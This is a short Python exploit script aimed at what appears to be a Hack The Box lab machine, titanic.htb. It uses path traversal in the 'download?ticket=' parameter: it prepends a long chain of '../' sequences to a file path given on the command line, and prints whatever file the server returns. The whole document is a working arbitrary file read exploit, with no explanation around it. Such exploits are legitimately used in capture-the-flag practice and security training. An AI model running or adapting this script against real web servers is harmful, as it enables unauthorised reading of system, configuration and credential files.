import os
import sys
import requests
from colorama import Fore, Style

def file_read(path):
	url = f"http://titanic.htb/download?ticket=../../../../../../../../../../../../../..{path}"
	try:
		req = requests.get(url)
		if (req.status_code == 200):
			print(Fore.GREEN + "[+] File found:" + Style.RESET_ALL)
			print(f"{req.text}")
		else:
			print(Fore.RED + "[-] File not found." + Style.RESET_ALL)
	except requests.exceptions.RequestException as e:
		print(Fore.RED + f"[-] Error occurred: {e}" + Style.RESET_ALL)

def main():
	if (len(sys.argv) != 2):
		print(Fore.RED + f"[-] Usage: python {sys.argv[0]} <file>" + Style.RESET_ALL)
		exit(0)

	file_read(sys.argv[1])

if __name__ == "__main__":
	main()